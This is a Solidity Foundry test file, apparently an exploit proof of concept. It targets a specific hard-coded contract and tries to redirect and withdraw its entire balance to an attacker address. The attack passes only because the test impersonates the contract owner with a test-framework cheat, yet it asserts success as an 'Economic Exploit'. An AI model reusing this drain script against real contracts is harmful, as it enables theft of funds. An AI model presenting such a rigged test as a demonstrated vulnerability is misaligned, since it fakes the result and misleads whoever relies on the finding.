// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IMetaApes {
    function getOwner() external view returns (address);
    function setrecadd(address _mkwa, address _krh, address _mdh, address _wth, address _ext, address _bbk, address _tfu) external;
    function cSb(uint256 aP) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xd764457Fadd15B52089BeE2b3c38964C7dFf0B70;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        deal(TARGET, 10 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        address owner = IMetaApes(TARGET).getOwner();

        vm.startPrank(owner);

        // Set the attacker's address as the recipient for the withdrawal
        IMetaApes(TARGET).setrecadd(
            address(0),
            address(0),
            address(0),
            address(0),
            address(0),
            address(0),
            attacker
        );

        // Withdraw 100% of the contract's BNB balance
        IMetaApes(TARGET).cSb(100);

        vm.stopPrank();
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
